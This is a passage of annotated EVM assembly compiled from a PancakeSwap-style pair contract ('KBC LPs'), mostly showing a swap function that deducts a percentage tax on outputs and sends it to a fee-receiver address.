   dup12\n        /* \"Pair.sol\":12536:12555  amount0Out * taxfee */\n      mul\n        /* \"Pair.sol\":12535:12562  (amount0Out * taxfee) / 100 */\n      dup2\n      tag_143\n      jumpi\n      invalid\n    tag_143:\n      div\n        /* \"Pair.sol\":12522:12532  amount0Out */\n      dup11\n        /* \"Pair.sol\":12522:12562  amount0Out - (amount0Out * taxfee) / 100 */\n      sub\n        /* \"Pair.sol\":12501:12562  uint taxamount0Out = amount0Out - (amount0Out * taxfee) / 100 */\n      swap1\n      pop\n        /* \"Pair.sol\":12576:12594  uint taxamount1Out */\n      0x00\n        /* \"Pair.sol\":12634:12637  100 */\n      0x64\n        /* \"Pair.sol\":12624:12630  taxfee */\n      sload(0x0a)\n        /* \"Pair.sol\":12611:12621  amount1Out */\n      dup12\n        /* \"Pair.sol\":12611:12630  amount1Out * taxfee */\n      mul\n        /* \"Pair.sol\":12610:12637  (amount1Out * taxfee) / 100 */\n      dup2\n      tag_144\n      jumpi\n      invalid\n    tag_144:\n        /* \"Pair.sol\":12737:12743  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":12775:12781  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":12610:12637  (amount1Out * taxfee) / 100 */\n      swap3\n      swap1\n      swap2\n      div\n        /* \"Pair.sol\":12597:12637  amount1Out - (amount1Out * taxfee) / 100 */\n      dup13\n      sub\n      swap3\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":12737:12743  token0 */\n      swap1\n      dup2\n      and\n      swap2\n        /* \"Pair.sol\":12775:12781  token1 */\n      dup2\n      and\n      swap1\n        /* \"Pair.sol\":12803:12816  to != _token0 */\n      dup12\n      and\n      dup3\n      eq\n      dup1\n      iszero\n      swap1\n        /* \"Pair.sol\":12803:12833  to != _token0 && to != _token1 */\n      tag_145\n      jumpi\n      pop\n        /* \"Pair.sol\":12826:12833  _token1 */\n      dup1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":12820:12833  to != _token1 */\n      and\n        /* \"Pair.sol\":12820:12822  to */\n      dup12\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":12820:12833  to != _token1 */\n      and\n      eq\n      iszero\n        /* \"Pair.sol\":12803:12833  to != _token0 && to != _token1 */\n    tag_145:\n        /* \"Pair.sol\":12795:12857  require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\") */\n      tag_146\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x13\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x68, 0x50616e63616b653a20494e56414c49445f544f)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_146:\n        /* \"Pair.sol\":12875:12889  amount0Out > 0 */\n      dup13\n      iszero\n        /* \"Pair.sol\":12871:12932  if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out) */\n      tag_148\n      jumpi\n        /* \"Pair.sol\":12891:12932  _safeTransfer(_token0, to, taxamount0Out) */\n      tag_148\n        /* \"Pair.sol\":12905:12912  _token0 */\n      dup3\n        /* \"Pair.sol\":12914:12916  to */\n      dup13\n        /* \"Pair.sol\":12918:12931  taxamount0Out */\n      dup7\n        /* \"Pair.sol\":12891:12904  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":12891:12932  _safeTransfer(_token0, to, taxamount0Out) */\n      jump\t// in\n    tag_148:\n        /* \"Pair.sol\":12984:12998  amount1Out > 0 */\n      dup12\n      iszero\n        /* \"Pair.sol\":12980:13041  if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out) */\n      tag_151\n      jumpi\n        /* \"Pair.sol\":13000:13041  _safeTransfer(_token1, to, taxamount1Out) */\n      tag_151\n        /* \"Pair.sol\":13014:13021  _token1 */\n      dup2\n        /* \"Pair.sol\":13023:13025  to */\n      dup13\n        /* \"Pair.sol\":13027:13040  taxamount1Out */\n      dup6\n        /* \"Pair.sol\":13000:13013  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":13000:13041  _safeTransfer(_token1, to, taxamount1Out) */\n      jump\t// in\n    tag_151:\n        /* \"Pair.sol\":13093:13108  data.length > 0 */\n      dup9\n      iszero\n        /* \"Pair.sol\":13089:13326  if (data.length > 0)... */\n      tag_152\n      jumpi\n        /* \"Pair.sol\":13134:13136  to */\n      dup11\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13126:13149  ICallee(to).pancakeCall */\n      and\n      0x84800812\n        /* \"Pair.sol\":13171:13181  msg.sender */\n      caller\n        /* \"Pair.sol\":13203:13216  taxamount0Out */\n      dup7\n        /* \"Pair.sol\":13253:13266  taxamount1Out */\n      dup7\n        /* \"Pair.sol\":13304:13308  data */\n      dup15\n      dup15\n        /* \"Pair.sol\":13126:13326  ICallee(to).pancakeCall(... */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup7\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup6\n      dup2\n      mstore\n      0x20\n      add\n      dup5\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup5\n      dup5\n      dup3\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n        /* \"--CODEGEN--\":30:33   */\n      dup1\n        /* \"--CODEGEN--\":22:28   */\n      dup3\n        /* \"--CODEGEN--\":14:20   */\n      dup5\n        /* \"--CODEGEN--\":1:34   */\n      calldatacopy\n        /* \"--CODEGEN--\":99:100   */\n      0x00\n        /* \"--CODEGEN--\":93:96   */\n      dup2\n        /* \"--CODEGEN--\":85:91   */\n      dup5\n        /* \"--CODEGEN--\":81:97   */\n      add\n        /* \"--CODEGEN--\":74:101   */\n      mstore\n        /* \"--CODEGEN--\":137:141   */\n      0x1f\n        /* \"--CODEGEN--\":133:142   */\n      not\n        /* \"--CODEGEN--\":126:130   */\n      0x1f\n        /* \"--CODEGEN--\":121:124   */\n      dup3\n        /* \"--CODEGEN--\":117:131   */\n      add\n        /* \"--CODEGEN--\":113:143   */\n      and\n        /* \"--CODEGEN--\":106:143   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":169:172   */\n      dup1\n        /* \"--CODEGEN--\":161:167   */\n      dup4\n        /* \"--CODEGEN--\":157:173   */\n      add\n        /* \"--CODEGEN--\":147:173   */\n      swap3\n      pop\n        /* \"Pair.sol\":13126:13326  ICallee(to).pancakeCall(... */\n      pop\n      pop\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_153\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_153:\n        /* \"Pair.sol\":13126:13326  ICallee(to).pancakeCall(... */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_154\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_154:\n        /* \"Pair.sol\":13126:13326  ICallee(to).pancakeCall(... */\n      pop\n      pop\n      pop\n      pop\n        /* \"Pair.sol\":13089:13326  if (data.length > 0)... */\n    tag_152:\n        /* \"Pair.sol\":13341:13350  uint tax0 */\n      0x00\n        /* \"Pair.sol\":13377:13380  100 */\n      0x64\n        /* \"Pair.sol\":13367:13373  taxfee */\n      sload(0x0a)\n        /* \"Pair.sol\":13354:13364  amount0Out */\n      dup16\n        /* \"Pair.sol\":13354:13373  amount0Out * taxfee */\n      mul\n        /* \"Pair.sol\":13353:13380  (amount0Out * taxfee) / 100 */\n      dup2\n      tag_155\n      jumpi\n      invalid\n    tag_155:\n      div\n        /* \"Pair.sol\":13341:13380  uint tax0 = (amount0Out * taxfee) / 100 */\n      swap1\n      pop\n        /* \"Pair.sol\":13394:13403  uint tax1 */\n      0x00\n        /* \"Pair.sol\":13430:13433  100 */\n      0x64\n        /* \"Pair.sol\":13420:13426  taxfee */\n      sload(0x0a)\n        /* \"Pair.sol\":13407:13417  amount1Out */\n      dup16\n        /* \"Pair.sol\":13407:13426  amount1Out * taxfee */\n      mul\n        /* \"Pair.sol\":13406:13433  (amount1Out * taxfee) / 100 */\n      dup2\n      tag_156\n      jumpi\n      invalid\n    tag_156:\n      div\n      swap1\n      pop\n        /* \"Pair.sol\":13452:13466  amount0Out > 0 */\n      dup15\n      iszero\n        /* \"Pair.sol\":13448:13508  if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_158\n      jumpi\n        /* \"Pair.sol\":13491:13501  FeeResiver */\n      sload(0x06)\n        /* \"Pair.sol\":13468:13508  _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_158\n      swap1\n        /* \"Pair.sol\":13482:13489  _token0 */\n      dup6\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13491:13501  FeeResiver */\n      and\n        /* \"Pair.sol\":13503:13507  tax0 */\n      dup5\n        /* \"Pair.sol\":13468:13481  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":13468:13508  _safeTransfer(_token0, FeeResiver, tax0) */\n      jump\t// in\n    tag_158:\n        /* \"Pair.sol\":13560:13574  amount1Out > 0 */\n      dup14\n      iszero\n        /* \"Pair.sol\":13556:13616  if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_160\n      jumpi\n        /* \"Pair.sol\":13599:13609  FeeResiver */\n      sload(0x06)\n        /* \"Pair.sol\":13576:13616  _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_160\n      swap1\n        /* \"Pair.sol\":13590:13597  _token1 */\n      dup5\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13599:13609  FeeResiver */\n      and\n        /* \"Pair.sol\":13611:13615  tax1 */\n      dup4\n        /* \"Pair.sol\":13576:13589  _safeTransfer */\n      tag_149\n        /* \"Pair.sol\":13576:13616  _safeTransfer(_token1, FeeResiver, tax1) */\n      jump\t// in\n    tag_160:\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":13709:13713  this */\n      address\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13675:13700  IERC20(_token0).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":13675:13700  IERC20(_token0).balanceOf */\n      dup7\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_161\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_161:\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_162\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_162:\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_163\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_163:\n      pop\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":13774:13778  this */\n      address\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap10\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":13740:13765  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":13675:13715  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":13740:13765  IERC20(_token1).balanceOf */\n      dup7\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_164\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_164:\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_165\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_165:\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_166\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_166:\n      pop\n        /* \"Pair.sol\":13740:13780  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap7\n      pop\n        /* \"Pair.sol\":13800:13814  uint amount0In */\n      0x00\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":13828:13850  _reserve0 - amount0Out */\n      dup6\n      and\n      dup11\n      swap1\n      sub\n        /* \"Pair.sol\":13817:13850  balance0 > _reserve0 - amount0Out */\n      dup4\n      gt\n        /* \"Pair.sol\":13817:13916  balance0 > _reserve0 - amount0Out... */\n      tag_167\n      jumpi\n        /* \"Pair.sol\":13915:13916  0 */\n      0x00\n        /* \"Pair.sol\":13817:13916  balance0 > _reserve0 - amount0Out... */\n      jump(tag_168)\n    tag_167:\n        /* \"Pair.sol\":13889:13899  amount0Out */\n      dup10\n        /* \"Pair.sol\":13877:13886  _reserve0 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":13877:13899  _reserve0 - amount0Out */\n      and\n      sub\n        /* \"Pair.sol\":13865:13873  balance0 */\n      dup4\n        /* \"Pair.sol\":13865:13900  balance0 - (_reserve0 - amount0Out) */\n      sub\n        /* \"Pair.sol\":13817:13916  balance0 > _reserve0 - amount0Out... */\n    tag_168:\n        /* \"Pair.sol\":13800:13916  uint amount0In = balance0 > _reserve0 - amount0Out... */\n      swap1\n      pop\n        /* \"Pair.sol\":13926:13940  uint amount1In */\n      0x00\n        /* \"Pair.sol\":13966:13976  amount1Out */\n      dup10\n        /* \"Pair.sol\":13954:13963  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":13954:13976  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"Pair.sol\":13943:13951  balance1 */\n      dup4\n        /* \"Pair.sol\":13943:13976  balance1 > _reserve1 - amount1Out */\n      gt\n        /* \"Pair.sol\":13943:14042  balance1 > _reserve1 - amount1Out... */\n      tag_169\n      jumpi\n        /* \"Pair.sol\":14041:14042  0 */\n      0x00\n        /* \"Pair.sol\":13943:14042  balance1 > _reserve1 - amount1Out... */\n      jump(tag_170)\n    tag_169:\n        /* \"Pair.sol\":14015:14025  amount1Out */\n      dup10\n        /* \"Pair.sol\":14003:14012  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":14003:14025  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"Pair.sol\":13991:13999  balance1 */\n      dup4\n        /* \"Pair.sol\":13991:14026  balance1 - (_reserve1 - amount1Out) */\n      sub\n        /* \"Pair.sol\":13943:14042  balance1 > _reserve1 - amount1Out... */\n    tag_170:\n        /* \"Pair.sol\":13926:14042  uint amount1In = balance1 > _reserve1 - amount1Out... */\n      swap1\n      pop\n        /* \"Pair.sol\":14085:14086  0 */\n      0x00\n        /* \"Pair.sol\":14073:14082  amount0In */\n      dup3\n        /* \"Pair.sol\":14073:14086  amount0In > 0 */\n      gt\n        /* \"Pair.sol\":14073:14103  amount0In > 0 || amount1In > 0 */\n      dup1\n      tag_171\n      jumpi\n      pop\n        /* \"Pair.sol\":14102:14103  0 */\n      0x00\n        /* \"Pair.sol\":14090:14099  amount1In */\n      dup2\n        /* \"Pair.sol\":14090:14103  amount1In > 0 */\n      gt\n        /* \"Pair.sol\":14073:14103  amount0In > 0 || amount1In > 0 */\n    tag_171:\n        /* \"Pair.sol\":14052:14163  require(... */\n      tag_172\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x22\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c\n      0x22\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_172:\n        /* \"Pair.sol\":14263:14284  uint balance0Adjusted */\n      0x00\n        /* \"Pair.sol\":14305:14347  balance0.mul(10000).sub(amount0In.mul(25)) */\n      tag_173\n        /* \"Pair.sol\":14329:14346  amount0In.mul(25) */\n      tag_174\n        /* \"Pair.sol\":14329:14338  amount0In */\n      dup5\n        /* \"Pair.sol\":14343:14345  25 */\n      0x19\n        /* \"Pair.sol\":14329:14346  amount0In.mul(25) */\n      0xffffffff\n        /* \"Pair.sol\":14329:14342  amount0In.mul */\n      tag_175\n        /* \"Pair.sol\":14329:14346  amount0In.mul(25) */\n      and\n      jump\t// in\n    tag_174:\n        /* \"Pair.sol\":14305:14324  balance0.mul(10000) */\n      tag_176\n        /* \"Pair.sol\":14305:14313  balance0 */\n      dup8\n        /* \"Pair.sol\":14318:14323  10000 */\n      0x2710\n        /* \"Pair.sol\":14305:14324  balance0.mul(10000) */\n      0xffffffff\n        /* \"Pair.sol\":14305:14317  balance0.mul */\n      tag_175\n        /* \"Pair.sol\":14305:14324  balance0.mul(10000) */\n      and\n      jump\t// in\n    tag_176:\n        /* \"Pair.sol\":14305:14328  balance0.mul(10000).sub */\n      swap1\n        /* \"Pair.sol\":14305:14347  balance0.mul(10000).sub(amount0In.mul(25)) */\n      0xffffffff\n        /* \"Pair.sol\":14305:14328  balance0.mul(10000).sub */\n      tag_177\n        /* \"Pair.sol\":14305:14347  balance0.mul(10000).sub(amount0In.mul(25)) */\n      and\n      jump\t// in\n    tag_173:\n        /* \"Pair.sol\":14263:14361  uint balance0Adjusted = (... */\n      swap1\n      pop\n        /* \"Pair.sol\":14375:14396  uint balance1Adjusted */\n      0x00\n        /* \"Pair.sol\":14417:14459  balance1.mul(10000).sub(amount1In.mul(25)) */\n      tag_178\n        /* \"Pair.sol\":14441:14458  amount1In.mul(25) */\n      tag_174\n        /* \"Pair.sol\":14441:14450  amount1In */\n      dup5\n        /* \"Pair.sol\":14455:14457  25 */\n      0x19\n        /* \"Pair.sol\":14441:14458  amount1In.mul(25) */\n      0xffffffff\n        /* \"Pair.sol\":14441:14454  amount1In.mul */\n      tag_175\n        /* \"Pair.sol\":14441:14458  amount1In.mul(25) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":14417:14459  balance1.mul(10000).sub(amount1In.mul(25)) */\n    tag_178:\n        /* \"Pair.sol\":14375:14473  uint balance1Adjusted = (... */\n      swap1\n      pop\n        /* \"Pair.sol\":14574:14620  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      tag_181\n        /* \"Pair.sol\":14609:14619  10000 ** 2 */\n      0x05f5e100\n        /* \"Pair.sol\":14574:14604  uint(_reserve0).mul(_reserve1) */\n      tag_182\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":14574:14589  uint(_reserve0) */\n      dup12\n      dup2\n      and\n      swap1\n        /* \"Pair.sol\":14574:14604  uint(_reserve0).mul(_reserve1) */\n      dup12\n      and\n      0xffffffff\n        /* \"Pair.sol\":14574:14593  uint(_reserve0).mul */\n      tag_175\n        /* \"Pair.sol\":14574:14604  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n    tag_182:\n        /* \"Pair.sol\":14574:14608  uint(_reserve0).mul(_reserve1).mul */\n      swap1\n        /* \"Pair.sol\":14574:14620  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      0xffffffff\n        /* \"Pair.sol\":14574:14608  uint(_reserve0).mul(_reserve1).mul */\n      tag_175\n        /* \"Pair.sol\":14574:14620  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      and\n      jump\t// in\n    tag_181:\n        /* \"Pair.sol\":14512:14550  balance0Adjusted.mul(balance1Adjusted) */\n      tag_183\n        /* \"Pair.sol\":14512:14528  balance0Adjusted */\n      dup4\n        /* \"Pair.sol\":14533:14549  balance1Adjusted */\n      dup4\n        /* \"Pair.sol\":14512:14550  balance0Adjusted.mul(balance1Adjusted) */\n      0xffffffff\n        /* \"Pair.sol\":14512:14532  balance0Adjusted.mul */\n      tag_175\n        /* \"Pair.sol\":14512:14550  balance0Adjusted.mul(balance1Adjusted) */\n      and\n      jump\t// in\n    tag_183:\n        /* \"Pair.sol\":14512:14620  balance0Adjusted.mul(balance1Adjusted) >=... */\n      lt\n      iszero\n        /* \"Pair.sol\":14487:14664  require(... */\n      tag_184\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0a\n      0x24\n      dup3\n      add\n      mstore\n      shl(0xb0, 0x50616e63616b653a204b)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_184:\n        /* \"Pair.sol\":1270:1271  _ */\n      pop\n      pop\n        /* \"Pair.sol\":14685:14734  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_185\n        /* \"Pair.sol\":14693:14701  balance0 */\n      dup5\n        /* \"Pair.sol\":14703:14711  balance1 */\n      dup5\n        /* \"Pair.sol\":14713:14722  _reserve0 */\n      dup9\n        /* \"Pair.sol\":14724:14733  _reserve1 */\n      dup9\n        /* \"Pair.sol\":14685:14692  _update */\n      tag_186\n        /* \"Pair.sol\":14685:14734  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_185:\n        /* \"Pair.sol\":14749:14815  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup4\n      swap1\n      mstore\n      dup1\n      dup3\n      add\n      dup14\n      swap1\n      mstore\n      0x60\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup12\n      and\n      swap2\n        /* \"Pair.sol\":14754:14764  msg.sender */\n      caller\n      swap2\n        /* \"Pair.sol\":14749:14815  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822\n      swap2\n      dup2\n      swap1\n      sub\n      0x80\n      add\n      swap1\n      log3\n      pop\n      pop\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      sstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"Pair.sol\":11956:14822  function swap(... */\n      jump\t// out\n        /* \"ERC20.sol\":175:214  string public constant name = \"KBC LPs\" */\n    tag_50:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":1607:1908  function getReserves()... */\n    tag_56:\n        /* \"Pair.sol\":1813:1821  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap3\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":1843:1851  reserve1 */\n      dup4\n      div\n      swap1\n      swap2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"Pair.sol\":1883:1901  blockTimestampLast */\n      swap1\n      div\n      0xffffffff\n      and\n      swap1\n        /* \"Pair.sol\":1607:1908  function getReserves()... */\n      jump\t// out\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_59:\n        /* \"ERC20.sol\":2877:2881  bool */\n      0x00\n        /* \"ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      tag_189\n        /* \"ERC20.sol\":2902:2912  msg.sender */\n      caller\n        /* \"ERC20.sol\":2914:2921  spender */\n      dup5\n        /* \"ERC20.sol\":2923:2928  value */\n      dup5\n        /* \"ERC20.sol\":2893:2901  _approve */\n      tag_190\n        /* \"ERC20.sol\":2893:2929  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_189:\n      pop\n        /* \"ERC20.sol\":2946:2950  true */\n      0x01\n        /* \"ERC20.sol\":2810:2957  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_188:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"Pair.sol\":587:608  address public token0 */\n    tag_61:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x08))\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":2834:3108  function initialize(... */\n    tag_64:\n        /* \"Pair.sol\":2973:2980  factory */\n      and(sub(shl(0xa0, 